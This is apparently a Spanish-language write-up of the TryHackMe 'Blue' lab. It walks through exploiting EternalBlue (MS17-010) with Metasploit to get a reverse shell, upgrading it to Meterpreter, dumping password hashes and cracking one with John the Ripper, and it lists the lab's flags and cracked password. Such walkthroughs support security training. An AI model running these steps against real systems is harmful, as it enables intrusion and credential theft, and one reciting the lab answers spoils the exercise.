Blue

 2023-08-27

Introducción

Se trata de la segunda máquina de la serie “Offensive Pentesting” de TryHackMe, que se centra en la explotación de la vulnerabilidad EternalBlue en sistemas Windows. Es una sala sencilla, destinada a familiarizarse con el reconocimiento, la explotación y el escalamiento de privilegios en sistemas Windows y en uso de Metasploit y Meterpreter.

Task 1 - Reconocimiento

Paso 1: Escaneo de Red

  • Utilicé Nmap para escanear la red y encontrar hosts disponibles.
  • Identifiqué el objetivo como 10.10.185.150.

Comando Nmap:

nmap -sn 10.10.185.0/24

Paso 2: Enumeración de Puertos

  • Realicé un escaneo de puertos con Nmap para identificar los puertos abiertos.
  • Descubrí que el puerto 445 (SMB) estaba abierto en el objetivo.

Comando Nmap:

nmap -p- 10.10.185.150

Task 2 - Explotación

Paso 3: Identificación de Vulnerabilidad

  • Investigé la vulnerabilidad MS17-010 y su explotación potencial.
  • Decidí utilizar el módulo “ms17_010_eternalblue” de Metasploit.

Herramienta Metasploit:

use windows/smb/ms17_010_eternalblue

Paso 4: Explotación

  • Configuré Metasploit con mi dirección IP como host.
  • Ejecuté el exploit para obtener acceso al sistema objetivo.
  • ¡Obtuve una shell en el sistema objetivo!

Comandos Metasploit:

set RHOSTS 10.10.185.150
set LHOST <mi dirección IP>
exploit

Task 3 - Escalamiento de Privilegios

Paso 5: Escalamiento de Privilegios

  • Exploré cómo aumentar mis privilegios y convertir mi shell en una sesión de Meterpreter.
  • Utilicé el módulo “shell_to_meterpreter” de Metasploit para lograrlo.

Comandos Metasploit:

use post/multi/manage/shell_to_meterpreter
set SESSION <número de sesión>
exploit

Task 4 - Descifrando Contraseñas

Paso 6: Extracción de Contraseñas

  • Con Meterpreter, ejecuté el comando “hashdump” para extraer las contraseñas almacenadas en el sistema.

Comando Meterpreter:

hashdump

Paso 7: Descifrando Contraseña

  • Copié el hash de contraseña de un usuario no predeterminado y utilicé John the Ripper para descifrarlo.
  • La contraseña descifrada resultante fue “alqfna22”.

Comandos John the Ripper:

john --wordlist=/usr/share/wordlists/rockyou.txt hashdump.txt --format=NT

Task 5 - Búsqueda de Banderas

Paso 8: Búsqueda de Banderas

  • Utilicé el comando “search” en Meterpreter para encontrar las ubicaciones de las banderas en el sistema.
  • Descubrí las siguientes banderas:
    • c:\\flag1.txt (ubicada en la raíz del sistema)
    • c:\\Windows\\System32\\config\\flag2.txt (ubicada en la carpeta de configuración)
    • c:\\Users\\Jon\\Documents\\flag3.txt (ubicada en la carpeta de documentos de un usuario)

Comando Meterpreter:

search -f flag*.txt

Paso 9: Exploración de Banderas

  • Usé comandos como “cat” para mostrar el contenido de las banderas y encontrar las respuestas a las preguntas planteadas.

Comando Meterpreter:

cat c:\\flag1.txt

Conclusión

Se trata de una máquina muy sencilla, ya que se cubren los aspectos clave de la enumeración, la explotación de vulnerabilidades, el escalamiento de privilegios, la extracción y el descifrado de contraseñas, y la búsqueda de ficheros en sistemas Windows.
